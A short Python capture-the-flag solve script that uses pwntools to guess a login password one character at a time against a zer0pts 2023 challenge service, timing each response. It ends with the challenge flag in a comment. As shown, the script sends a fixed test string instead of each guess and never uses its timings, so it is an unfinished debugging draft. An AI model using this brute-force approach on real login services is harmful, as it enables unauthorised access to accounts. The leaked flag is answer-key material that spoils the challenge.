import string
from pwn import *
import time

password = b""

for _ in range(16):
    for guess in string.printable:
        print(password + guess.encode())
        # r = remote('misc.2023.zer0pts.com', 10022)
        r = remote('localhost', 10022)
        r.recvuntil(b'Username: ')
        r.sendline(b'guest')
        r.recvuntil(b'Password: ')
        start = time.time()
        # r.send(password + guess.encode())
        r.send(b"gg")
        result = r.recvline(timeout=20)
        end = time.time()
        print(end - start)
        r.close()
        if b"Incorrect" not in result:
            password += guess.encode()
            print(password)
            break

# flag: zer0pts{d0Nt_r3sp0nd_t00_qu1ck}
